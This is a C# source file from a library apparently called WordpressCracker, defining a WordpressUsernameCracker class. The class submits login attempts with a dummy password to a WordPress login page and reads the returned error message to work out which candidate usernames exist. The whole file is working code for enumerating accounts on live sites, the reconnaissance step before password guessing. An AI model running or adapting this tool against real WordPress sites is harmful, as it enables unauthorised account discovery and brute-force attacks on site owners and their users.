﻿using Opapps.Lib.WordpressCracker.Entities;
using Opapps.Lib.WordpressCracker.Entities.Interfaces;
using Opapps.Lib.WordpressCracker.Helpers;
using Opapps.Lib.WordpressCracker.Helpers.Interfaces;
using Opapps.Lib.WordpressCracker.Services.Abstracts;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Opapps.Lib.WordpressCracker.Services
{
    public class WordpressUsernameCracker : WordpressCrackerService
    {
        private readonly static IHtmlParser _htmlParser = new HtmlParser();
        private readonly IUsernameCrackingConfiguration _config;
        public WordpressUsernameCracker() : base()
        {
            _config = new UsernameCrackingConfiguration();
        }

        public WordpressUsernameCracker(IRequestConfiguration requestConfig) : base(requestConfig)
        {
            _config = new UsernameCrackingConfiguration();
        }

        public WordpressUsernameCracker(IUsernameCrackingConfiguration config) : base()
        {
            _config = config;
        }

        public WordpressUsernameCracker(IUsernameCrackingConfiguration config, IRequestConfiguration requestConfig) : base(requestConfig)
        {
            _config = config;
        }


        public async Task<bool> AttemptGettingValidUsername(Uri loginUrl, string username)
        {
            using HttpResponseMessage response = await PostAsync(loginUrl, new FormData(username, _config.DummyPassword));
            string htmlContent = await response.Content.ReadAsStringAsync();

            string? errorMessage = _htmlParser.GetInnerTextWithXpath("//div[@id = 'login_error']", htmlContent)?.Trim();

            return CheckUsernameValid(errorMessage, _config);

        }

        /// <summary>
        /// Check to see for a valid username, and will stop executing after getting a valid username.
        /// </summary>
        /// <returns>The valid username if exists, otherwise null</returns>
        public async Task<string?> AttemptGettingValidUsernameRange(Uri loginUrl, IEnumerable<string> usernames)
        {
            foreach(var username in usernames)
            {
                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
                if (isValidUsername) return username;
            }

            return null;
        }

        /// <summary>
        /// Check to see for all valid usernames
        /// </summary>
        /// <returns>The valid usernames if any, otherwise null</returns>
        public async Task<IEnumerable<string>?> AttemptGettingValidUsernamesRange(Uri loginUrl, IEnumerable<string> usernames) 
        {
            List<string> validUsernames = new();

            foreach (var username in usernames)
            {
                bool isValidUsername = await AttemptGettingValidUsername(loginUrl, username);
                if (isValidUsername) validUsernames.Add(username);
            }

            return validUsernames.Any() ? validUsernames : null;
        }

        private bool CheckUsernameValid(string? errorMessage, IUsernameCrackingConfiguration config)
        {
            if (errorMessage == null) return true; // login success, wew. 1/10000 probability.

            if (config.AutoDetectUsernameErrorMessage) {
                // TODO
                throw new NotImplementedException("Sorry, for auto-detect username error message feature, currently haven't been implemented");
            } 
            
            // Calculate similarity to check to see if the error message that we get is not a wrong username error message.
            // If so, then it's the other error message (hopefully is a wrong password error message), return true.
            // A better way perhaps we also calculate similarity to check if the error message is a wrong password error message,
            // but it's another work for another day.
            return !(config.UsernameErrorMessage.CalculateSimilarityWith(errorMessage) > 0.65);
        }

    }
}
